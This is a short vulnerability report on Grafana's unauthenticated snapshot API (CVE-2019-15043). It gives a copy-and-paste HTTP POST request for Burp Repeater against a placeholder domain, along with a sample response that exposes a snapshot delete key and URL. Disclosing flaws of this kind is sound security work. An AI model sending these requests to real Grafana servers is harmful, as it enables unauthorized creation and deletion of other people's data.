
# Grafana snapshots can be removed (CVE-2019-15043)

## Summary

Due to Grafana unauthenticated API (CVE-2019-15043) is possible to remove snapshots without being authenticated. 

According to [Grafana docs](http://docs.grafana.org/reference/sharing/):

> **Dashboard snapshot** A dashboard snapshot is an instant way to share an interactive dashboard publicly. When created, we strip sensitive data like queries (metric, template and annotation) and panel links, leaving only the visible metric data and series names embedded into your dashboard. Dashboard snapshots can be accessed by anyone who has the link and can reach the URL.

## Steps To Reproduce

 1. Request in Burp Repeater (Copy and paste and set the  target to $DOMAIN and port 443)
 
 
 ```
 POST /api/snapshots HTTP/1.1
Host: $DOMAIN
Connection: close
Accept: */*
Accept-Language: en
Connection: close
Content-Type: application/json
User-Agent: Mozilla/5.0
Content-Length: 258

{"dashboard":
      {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows":
      [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires":
      3600}
```

Response

```
HTTP/1.1 200 OK
Date: Sun, 18 Oct 2020 07:35:37 GMT
Content-Type: application/json; charset=UTF-8
Connection: close
..
Chuncked
..

{
"deleteKey":"o2ZI3cjYCTO63VdRGD5GOW7SmVUBsLIz",
"deleteUrl":"https://$DOMAIN/api/snapshots-delete/XXX",
"key":"KEY",
"url":"https://$DOMAIN/dashboard/snapshot/XXY"
}
```


**DeleteUrl**

$SNAPSHOT


## Impact

Dashboards created to be shared using the snapshot feature might be deleted by any unauthenticated user, damaging the ability to share data publicly. 
 

### Supporting Material/References:

https://www.cvedetails.com/cve/CVE-2019-15043/
Another POC 
https://github.com/h0ffayyy/CVE-2019-15043



